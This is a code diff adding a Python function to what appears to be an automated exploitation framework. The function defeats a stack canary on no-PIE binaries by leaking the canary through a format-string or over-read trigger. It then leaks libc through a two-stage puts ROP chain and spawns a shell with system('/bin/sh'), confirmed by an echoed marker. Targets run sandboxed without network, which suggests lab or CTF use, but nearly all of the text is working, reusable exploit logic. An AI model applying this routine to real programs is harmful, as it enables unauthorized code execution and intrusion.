@@ -388,3 +388,121 @@ def analyst_ret2libc(exe, workdir, *, offset, libc_data, leak_offset=None, leak_
                     pass
     return {"ok": False, "reason": "no shell confirmed (leak parsed but the pure-libc chain did not "
                                    "spawn a shell under either alignment)", "base": last}
+
+
+# --- ret2libc past a STACK CANARY (leak it, write it back, then chain) ---------------------------
+def canary_ret2libc(exe, workdir, *, offset, canary_offset, ret_offset, canary_trigger,
+                    pop_rdi, puts_plt, puts_got, ret_to, puts_off, system_off, binsh_off,
+                    ret_gadget=None, canary_index=None, canary_regex: str = r"0x[0-9a-fA-F]+",
+                    loop_feed: bytes = None, base_argv=(), marker: bytes = b"LYKOS-CAN-9931",
+                    timeout: float = 8.0, mem_mb: int = 2048) -> dict:
+    """ret2libc on a stack-canary-protected no-PIE target. A canary is a per-process random word
+    between the buffer and the saved return; overflowing past it trips __stack_chk_fail unless the
+    canary is written back UNCHANGED, and its value is random so it has to be LEAKED at runtime.
+
+    `canary_trigger` (a format string / an over-read request) discloses the canary in the SAME
+    process; `rop.find_canary` picks it out (or `canary_index` names the leak slot). Every overflow
+    then carries `build_canary_prefix` -- pad to the canary, the leaked canary, pad to the return --
+    before the ROP. The rest is the two-stage puts leak: stage 1 leaks libc and returns to `ret_to`,
+    stage 2 calls system("/bin/sh"). `loop_feed` is what the re-entered loop reads before the second
+    overflow (default: the canary trigger again, harmless). Confirmed by a spawned shell.
+    """
+    import re as _re
+    import struct as _struct
+
+    from . import rop
+    rx = _re.compile(canary_regex.encode("latin-1"))
+    q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
+    feed = canary_trigger if loop_feed is None else loop_feed
+    exedir = str(Path(exe).resolve().parent)
+    argv = [str(a) for a in base_argv]
+
+    def _canary(p):
+        try:
+            p.stdin.write(canary_trigger)
+            p.stdin.flush()
+        except (BrokenPipeError, OSError):
+            return None
+        dump = _read_until(p, time.time() + timeout / 2)
+        vals = [int(m.group(0), 16) for m in rx.finditer(dump)
+                if _allint(m.group(0))]
+        if canary_index is not None and -len(vals) <= canary_index < len(vals):
+            return vals[canary_index]
+        return rop.find_canary(vals)
+
+    for align in (None, ret_gadget):
+        for _ in range(3):
+            preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
+            cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
+            try:
+                p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                     stderr=subprocess.STDOUT, cwd=exedir,
+                                     start_new_session=True, preexec_fn=preexec)
+            except Exception as e:                               # noqa: BLE001
+                return {"ok": False, "reason": f"spawn failed: {e!r}"}
+            try:
+                _read_until(p, time.time() + 0.5)
+                canary = _canary(p)
+                if canary is None:
+                    continue
+                pre = rop.build_canary_prefix(canary_offset, canary, ret_offset)
+                # stage 1: leak libc via puts (canary preserved), return to the loop
+                s1 = pre + q(pop_rdi) + q(puts_got) + q(puts_plt) + q(ret_to)
+                try:
+                    p.stdin.write(s1)
+                    p.stdin.flush()
+                except (BrokenPipeError, OSError):
+                    continue
+                burst = _read_until(p, time.time() + timeout / 2)
+                raw = burst.split(b"\n", 1)[0][:6]
+                if len(raw) < 6:
+                    continue
+                base = rop.resolve_libc_base(int.from_bytes(raw.ljust(8, b"\x00"), "little"), puts_off)
+                if not base:
+                    continue
+                # re-entered loop: satisfy the intermediate read, then stage 2 (system)
+                try:
+                    p.stdin.write(feed)
+                    p.stdin.flush()
+                except (BrokenPipeError, OSError):
+                    continue
+                _read_until(p, time.time() + 0.4)
+                s2 = bytearray(pre)
+                if align:
+                    s2 += q(align)
+                s2 += q(pop_rdi) + q(base + binsh_off) + q(base + system_off)
+                try:
+                    p.stdin.write(bytes(s2))
+                    p.stdin.flush()
+                    time.sleep(0.3)
+                    p.stdin.write(b"echo " + marker + b"\n")
+                    p.stdin.flush()
+                except (BrokenPipeError, OSError):
+                    break                                       # wrong parity
+                out = _read_until(p, time.time() + timeout, quiet=1.5)
+                if marker in out:
+                    return {"ok": True, "canary": canary, "base": base,
+                            "system": base + system_off, "align": align,
+                            "output": out[:400].decode("latin-1", "ignore")}
+            finally:
+                for s in (p.stdin, p.stdout):
+                    try:
+                        if s is not None:
+                            s.close()
+                    except Exception:                           # noqa: BLE001
+                        pass
+                _kill(p)
+                try:
+                    p.wait(timeout=2)
+                except Exception:                               # noqa: BLE001
+                    pass
+    return {"ok": False, "reason": "canary leaked but the ret2libc chain did not spawn a shell "
+                                   "(offsets/leak slot?)"}
+
+
+def _allint(b):
+    try:
+        int(b, 16)
+        return True
+    except ValueError:
+        return False
